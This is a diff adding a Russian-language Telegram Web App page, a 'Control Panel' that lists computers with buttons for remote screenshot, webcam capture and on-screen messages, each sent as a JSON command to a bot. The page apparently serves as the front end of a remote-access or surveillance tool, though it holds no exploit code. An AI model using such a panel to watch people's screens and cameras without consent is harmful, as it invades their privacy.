@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #18222d);
+            color: var(--tg-theme-text-color, #ffffff);
+            margin: 0;
+            padding: 16px;
+        }
+        h2 { text-align: center; font-size: 18px; margin-bottom: 20px; }
+        .pc-card {
+            background-color: var(--tg-theme-secondary-bg-color, #232e3c);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .pc-info span { display: block; font-size: 14px; font-weight: bold; }
+        .pc-info small { color: var(--tg-theme-hint-color, #8793a1); font-size: 12px; }
+        .btn-group { display: flex; gap: 6px; }
+        button {
+            background-color: var(--tg-theme-button-color, #2ea6ff);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none;
+            border-radius: 8px;
+            padding: 8px 12px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:active { opacity: 0.8; }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: var(--tg-theme-secondary-bg-color, #232e3c);
+            padding: 20px;
+            border-radius: 12px;
+            width: 80%;
+            max-width: 300px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-top: 10px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 1px solid var(--tg-theme-hint-color, #8793a1);
+            background: var(--tg-theme-bg-color, #18222d);
+            color: var(--tg-theme-text-color, #ffffff);
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Управление устройствами</h2>
+    
+    <div id="pc-list">
+        <!-- Список ПК динамически подтягивается сюда -->
+        <div class="pc-card">
+            <div class="pc-info">
+                <span>DESKTOP-TEST</span>
+                <small>В сети • Активен</small>
+            </div>
+            <div class="btn-group">
+                <button onclick="sendCommand('DESKTOP-TEST', 'SCREEN')">Скрин</button>
+                <button onclick="sendCommand('DESKTOP-TEST', 'CAM')">Вебка</button>
+                <button onclick="openModal('DESKTOP-TEST')">Текст</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для отправки сообщения -->
+    <div id="msgModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-top:0; font-size:15px;">Отправить сообщение</h3>
+            <input type="text" id="msgText" placeholder="Введите текст...">
+            <div style="display: flex; justify-content: flex-end; gap: 8px;">
+                <button onclick="closeModal()" style="background: gray;">Отмена</button>
+                <button onclick="sendCustomMessage()">Отправить</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        let activePc = '';
+
+        function sendCommand(pcName, action) {
+            // Передаем данные обратно в бота через закрытие или отправку инфы
+            const data = JSON.stringify({ pc: pcName, cmd: action });
+            tg.sendData(data);
+            tg.close();
+        }
+
+        function openModal(pcName) {
+            activePc = pcName;
+            document.getElementById('msgModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('msgModal').style.display = 'none';
+            document.getElementById('msgText').value = '';
+        }
+
+        function sendCustomMessage() {
+            const text = document.getElementById('msgText').value;
+            if (!text) return;
+            const data = JSON.stringify({ pc: activePc, cmd: `MSG:${text}` });
+            tg.sendData(data);
+            closeModal();
+            tg.close();
+        }
+    </script>
+</body>
+</html>
